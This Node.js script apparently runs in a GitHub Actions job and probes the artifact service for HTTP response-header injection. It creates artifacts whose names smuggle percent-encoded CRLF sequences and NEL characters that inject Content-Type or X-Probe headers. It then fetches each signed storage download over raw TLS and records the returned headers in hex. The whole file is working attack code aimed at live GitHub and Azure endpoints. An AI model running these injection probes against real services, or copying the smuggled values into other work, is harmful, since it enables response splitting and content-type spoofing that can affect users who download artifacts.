import {createHash} from 'node:crypto';
import tls from 'node:tls';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const repo = process.env.GITHUB_REPOSITORY;
const token = process.env.GITHUB_TOKEN;
const runId = process.env.GITHUB_RUN_ID;
const body = Buffer.from('{"hdrgen":"body"}');
const sha = (b) => createHash('sha256').update(b).digest('hex');

function rawTls(urlStr) {
  const u = new URL(urlStr);
  return new Promise((resolve, reject) => {
    const socket = tls.connect({host: u.hostname, port: Number(u.port || 443), servername: u.hostname, ALPNProtocols: ['http/1.1']});
    socket.setTimeout(25000);
    const chunks = [];
    socket.once('secureConnect', () => {
      socket.write(`GET ${u.pathname}${u.search} HTTP/1.1\r\nHost: ${u.host}\r\nUser-Agent: hdrgen\r\nConnection: close\r\n\r\n`);
    });
    socket.on('data', (c) => chunks.push(c));
    socket.once('error', reject);
    socket.once('timeout', () => socket.destroy(new Error('timeout')));
    socket.once('end', () => {
      const raw = Buffer.concat(chunks);
      const idx = raw.indexOf('\r\n\r\n');
      resolve({status: Number((raw.subarray(0, 30).toString('latin1').split(' ')[1]) || 0), head: raw.subarray(0, idx < 0 ? raw.length : idx), body: idx < 0 ? Buffer.alloc(0) : raw.subarray(idx + 4)});
    });
  });
}

const nameBase = `hdrgen-${runId}`;
const cases = [
  ['control', `${nameBase}-ctl`],
  ['colon', `${nameBase}-colon:tok`],
  ['space', `${nameBase}-sp ace`],
  ['eacute', `${nameBase}-é`],
  ['pct-crlf-inject', `${nameBase}-%0d%0aContent-Type:application/json`],
  ['eacute-pct-crlf-inject', `${nameBase}-é%0d%0aContent-Type:application/json`],
  ['eacute-inject-utf8nel', `${nameBase}-é%0d%0aContent-Type:application/json%C2%85`],
  ['eacute-inject-rawnel', `${nameBase}-é%0d%0aContent-Type:application/json%85`],
  ['eacute-inject-x85', `${nameBase}-é%0d%0aX-Probe:application/json%C2%85`],
];
const out = [];
for (const [label, name] of cases) {
  const rec = {label, nameB64: Buffer.from(name, 'utf8').toString('base64')};
  try {
    const created = await client.CreateArtifact({...ids, name, version: 7, mimeType: StringValue.create({value: 'application/json'})});
    rec.createOk = Boolean(created.ok);
    if (!created.ok) { out.push(rec); continue; }
    await new BlobClient(created.signedUploadUrl).getBlockBlobClient().uploadData(body);
    const fin = await client.FinalizeArtifact({...ids, name, size: String(body.length), hash: StringValue.create({value: `sha256:${sha(body)}`})});
    rec.finOk = Boolean(fin.ok);
    rec.id = String(fin.artifactId || '');
    if (!fin.ok) { out.push(rec); continue; }
    const rest = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${rec.id}/zip`, {
      headers: {authorization: `Bearer ${token}`, accept: 'application/vnd.github.v3+json', 'user-agent': 'hdrgen'}, redirect: 'manual',
    });
    const loc = rest.headers.get('location') || '';
    rec.locationShort = loc.slice(0, 120);
    const u = new URL(loc);
    rec.rsct = u.searchParams.get('rsct');
    rec.rscd = u.searchParams.get('rscd');
    if (loc) {
      const r = await rawTls(loc);
      rec.finalStatus = r.status;
      const lines = r.head.toString('latin1').split('\r\n').slice(1);
      rec.headers = lines.filter((l) => l.trim() !== '').map((l) => {
        const p = l.indexOf(':');
        const n = p < 0 ? l : l.slice(0, p);
        const v = p < 0 ? '' : l.slice(p + 1).trim();
        return [Buffer.from(n, 'latin1').toString('hex'), Buffer.from(v, 'latin1').toString('hex')];
      });
      rec.bodyMatch = r.body.equals(body);
    }
  } catch (e) {
    rec.err = String(e).slice(0, 250);
  }
  out.push(rec);
}
console.log('HDRGEN', JSON.stringify(out));
